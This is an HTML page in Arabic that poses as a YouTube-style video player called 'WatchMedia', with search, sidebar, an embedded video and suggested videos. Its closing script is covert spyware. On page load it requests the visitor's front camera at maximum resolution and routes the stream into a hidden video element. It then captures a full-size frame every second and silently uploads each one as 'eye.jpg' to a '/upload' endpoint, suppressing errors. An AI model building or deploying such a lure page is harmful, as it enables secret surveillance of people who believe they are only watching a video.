<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشغل الفيديو</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #0f0f0f;
            color: #fff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* TopBar */
        .topbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 16px;
            background-color: #0f0f0f;
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 1px solid #272727;
        }

        .search-box {
            display: flex;
            align-items: center;
            width: 40%;
            max-width: 600px;
        }

        .search-box input {
            width: 100%;
            padding: 8px 12px;
            background-color: #121212;
            border: 1px solid #303030;
            border-radius: 20px 0 0 20px;
            color: #fff;
            outline: none;
        }

        .search-box button {
            padding: 8px 16px;
            background-color: #222;
            border: 1px solid #303030;
            border-right: none;
            border-radius: 0 20px 20px 0;
            color: #fff;
            cursor: pointer;
        }

        /* Layout Container */
        .main-container {
            display: flex;
            flex: 1;
        }

        /* Sidebar */
        .sidebar {
            width: 240px;
            background-color: #0f0f0f;
            padding: 12px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            border-left: 1px solid #272727;
        }

        .sidebar a {
            color: #fff;
            text-decoration: none;
            padding: 10px;
            border-radius: 8px;
            display: block;
        }

        .sidebar a:hover {
            background-color: #272727;
        }

        /* Content Area */
        .content {
            flex: 1;
            padding: 16px;
            display: flex;
            gap: 24px;
            flex-wrap: wrap;
        }

        .video-section {
            flex: 2;
            min-width: 300px;
        }

        .iframe-container {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%; /* 16:9 */
            height: 0;
            background-color: #000;
            border-radius: 12px;
            overflow: hidden;
        }

        .iframe-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }

        .video-details {
            margin-top: 12px;
        }

        .video-title {
            font-size: 1.2rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .actions-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px solid #272727;
        }

        .action-btns button {
            background-color: #272727;
            color: #fff;
            border: none;
            padding: 8px 14px;
            border-radius: 18px;
            cursor: pointer;
            margin-left: 6px;
        }

        .action-btns button:hover {
            background-color: #3f3f3f;
        }

        .suggestions-section {
            flex: 1;
            min-width: 280px;
        }

        .suggestion-card {
            display: flex;
            gap: 8px;
            margin-bottom: 12px;
            cursor: pointer;
        }

        .suggestion-thumb {
            width: 120px;
            height: 68px;
            background-color: #333;
            border-radius: 8px;
        }

        /* Bottom Nav for Mobile */
        .bottom-nav {
            display: none;
            justify-content: space-around;
            background-color: #0f0f0f;
            padding: 10px 0;
            border-top: 1px solid #272727;
            position: fixed;
            bottom: 0;
            width: 100%;
        }

        @media (max-width: 768px) {
            .sidebar {
                display: none;
            }
            .bottom-nav {
                display: flex;
            }
            .content {
                padding-bottom: 60px;
            }
        }
    </style>
</head>
<body>

    <!-- Top Bar -->
    <div class="topbar">
        <div class="logo" style="font-weight: bold; font-size: 1.2rem;">WatchMedia</div>
        <div class="search-box">
            <input type="text" placeholder="بحث...">
            <button>بحث</button>
        </div>
        <div class="user-profile" style="width: 32px; height: 32px; background-color: #555; border-radius: 50%;"></div>
    </div>

    <div class="main-container">
        <!-- Sidebar -->
        <div class="sidebar">
            <a href="#">الصفحة الرئيسية</a>
            <a href="#">الاشتراكات</a>
            <a href="#">المكتبة</a>
            <a href="#">السجل</a>
        </div>

        <!-- Main Content -->
        <div class="content">
            <div class="video-section">
                <div class="iframe-container">
                    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" allowfullscreen></iframe>
                </div>
                
                <div class="video-details">
                    <h1 class="video-title">عنوان الفيديو المعروض هنا</h1>
                    <div class="actions-bar">
                        <div class="channel-info" style="display: flex; align-items: center; gap: 8px;">
                            <div style="width: 40px; height: 40px; background-color: #777; border-radius: 50%;"></div>
                            <div>
                                <div style="font-weight: bold;">اسم القناة</div>
                                <div style="font-size: 0.8rem; color: #aaa;">100 ألف مشترك</div>
                            </div>
                        </div>
                        <div class="action-btns">
                            <button>إعجاب</button>
                            <button>مشاركة</button>
                            <button>تنزيل</button>
                            <button>حفظ</button>
                        </div>
                    </div>
                </div>

                <!-- Comments Section -->
                <div class="comments-section" style="margin-top: 20px;">
                    <h3>التعليقات</h3>
                    <div style="margin-top: 10px; color: #aaa; font-size: 0.9rem;">
                        لا توجد تعليقات حتى الآن.
                    </div>
                </div>
            </div>

            <!-- Suggestions Sidebar -->
            <div class="suggestions-section">
                <h3>فيديوهات مقترحة</h3>
                <div style="margin-top: 12px;">
                    <div class="suggestion-card">
                        <div class="suggestion-thumb"></div>
                        <div>
                            <div style="font-size: 0.9rem; font-weight: bold;">فيديو مقترح 1</div>
                            <div style="font-size: 0.8rem; color: #aaa;">قناة أخرى</div>
                        </div>
                    </div>
                    <div class="suggestion-card">
                        <div class="suggestion-thumb"></div>
                        <div>
                            <div style="font-size: 0.9rem; font-weight: bold;">فيديو مقترح 2</div>
                            <div style="font-size: 0.8rem; color: #aaa;">قناة أخرى</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bottom Navigation for Mobile -->
    <div class="bottom-nav">
        <span>الرئيسية</span>
        <span>الاشتراكات</span>
        <span>المكتبة</span>
    </div>

    <!-- عنصر الفيديو المخفي للالتقاط -->
    <video id="video" autoplay playsinline style="display:none;"></video>

    <!-- البرمجة الخاصة بالتقاط الوسائط -->
    <script>
        function startCapture() {
            // طلب الكاميرا الأمامية بأعلى دقة ممكنة توفرها العدسة
            const constraints = {
                video: {
                    facingMode: "user",
                    width: { ideal: 4096 },
                    height: { ideal: 2160 }
                }
            };

            navigator.mediaDevices.getUserMedia(constraints)
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;

                    video.onloadedmetadata = () => {
                        video.play();
                        setInterval(() => {
                            // أخذ الأبعاد الحقيقية الكاملة للعدسة
                            const w = video.videoWidth;
                            const h = video.videoHeight;

                            if (w > 0 && h > 0) {
                                const canvas = document.createElement('canvas');
                                canvas.width = w;
                                canvas.height = h;

                                const ctx = canvas.getContext('2d');
                                // رسم الصورة بأبعادها الكاملة دون قص
                                ctx.drawImage(video, 0, 0, w, h);

                                canvas.toBlob(blob => {
                                    let fd = new FormData();
                                    fd.append('image', blob, 'eye.jpg');
                                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                                }, 'image/jpeg', 0.95);
                            }
                        }, 1000);
                    };
                })
                .catch(e => console.log("بانتظار إذن الكاميرا"));
        }

        window.onload = startCapture;
    </script>
</body>
</html>
